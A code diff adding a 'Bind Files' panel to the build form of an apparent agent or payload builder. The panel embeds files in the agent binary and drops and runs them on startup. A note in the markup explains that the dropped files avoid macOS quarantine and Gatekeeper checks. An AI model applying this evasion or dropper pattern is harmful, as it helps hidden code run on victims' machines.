@@ -436,6 +436,47 @@
                 </div>
               </div>
 
+              <!-- == Section 6: Bind Files (collapsed) == -->
+              <div class="accordion-section border border-slate-800 rounded-lg overflow-hidden" data-open="false">
+                <button type="button" class="accordion-header w-full flex items-center justify-between px-4 py-3 bg-slate-800/50 hover:bg-slate-800/80 transition-colors text-left">
+                  <span class="flex items-center gap-2 text-sm font-medium text-slate-200">
+                    <i class="fa-solid fa-paperclip text-violet-400"></i>
+                    Bind Files
+                    <span class="text-xs text-slate-500 font-normal">Embed &amp; run files on startup</span>
+                  </span>
+                  <i class="fa-solid fa-chevron-down accordion-chevron text-slate-400 text-xs"></i>
+                </button>
+                <div class="accordion-body">
+                  <div class="accordion-inner px-4 pb-4 pt-3 flex flex-col gap-3">
+
+                    <p class="text-xs text-slate-400">
+                      Files are embedded inside the agent binary and written to a temp directory when the agent starts.
+                      Up to 5 files, 10 MB each. Files set to <em>Execute</em> are launched immediately after being dropped.
+                    </p>
+
+                    <!-- macOS Gatekeeper note -->
+                    <div class="flex items-start gap-2 p-3 bg-amber-900/20 border border-amber-700/40 rounded-lg text-xs text-amber-300">
+                      <i class="fa-brands fa-apple mt-0.5 shrink-0"></i>
+                      <span>
+                        <strong>macOS note:</strong> Files are written programmatically and do <em>not</em> receive the quarantine flag,
+                        so Gatekeeper usually will not block them. However, on newer macOS versions (Ventura+) unsigned binaries may
+                        still be restricted depending on system policy.
+                      </span>
+                    </div>
+
+                    <!-- Bound file list -->
+                    <div id="bind-files-list" class="flex flex-col gap-2"></div>
+
+                    <!-- Add file button -->
+                    <label id="bind-add-label" class="flex items-center justify-center gap-2 px-4 py-2 rounded-lg border border-dashed border-slate-600 cursor-pointer hover:border-violet-500 transition-colors text-sm text-slate-400 hover:text-violet-400">
+                      <i class="fa-solid fa-plus"></i> Add File
+                      <input type="file" id="bind-file-input" class="hidden" />
+                    </label>
+
+                  </div>
+                </div>
+              </div>
+
               <!-- Build Button -->
               <button type="submit" id="build-btn"
                 class="flex items-center justify-center gap-2 px-4 py-3 rounded-lg bg-blue-600 hover:bg-blue-700 text-white font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed">
